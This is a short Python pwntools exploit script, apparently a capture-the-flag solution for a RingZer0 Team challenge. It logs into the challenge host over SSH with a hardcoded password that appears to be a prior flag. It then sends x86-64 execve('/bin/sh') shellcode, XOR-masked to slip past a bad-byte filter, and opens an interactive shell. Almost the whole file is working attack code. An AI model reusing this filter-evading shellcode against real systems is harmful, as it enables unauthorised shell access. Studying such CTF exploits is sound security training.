#!/usr/bin/env python2
from pwn import*
context(arch = 'amd64', os = 'linux')

def escape_encode(s):
    ret = ''
    for c in s:
        ret += '\\x%02x' % ord(c)
    return ret

def limit(s):
    if len(s) > 50:
        return False
    for c in s:
        if c == '\x0a':
            return False
        if c == '\x0d':
            return False
        if c == '\x2f':
            return False
        if c == '\x2e':
            return False
        if c == '\x62':
            return False
        if c == '\x99':
            return False
    return True

conn = ssh(user = 'level2', 
           host = 'challenges.ringzer0team.com', 
           password = 'FLAG-1Ql864uTj8pY2470t85VX42q1B', 
           port = 10127)
shell = conn.shell()

mask = 0xAAAAAAAAAAAAAAAA
shellcode =  asm('mov rcx, 0x%016x' % mask)
shellcode += asm('mov rax, 0x%016x' % (unpack('/bin/sh\x00', 64) ^ mask))
shellcode += asm('xor rax, rcx')
shellcode += asm('push rax')
shellcode += asm('xor rax, rax')
shellcode += asm('mov al, SYS_execve')
shellcode += asm('xor rsi, rsi')
shellcode += asm('xor rdx, rdx')
shellcode += asm('mov rdi, rsp')
shellcode += asm('syscall')

shell.sendline(escape_encode(shellcode))
shell.interactive()
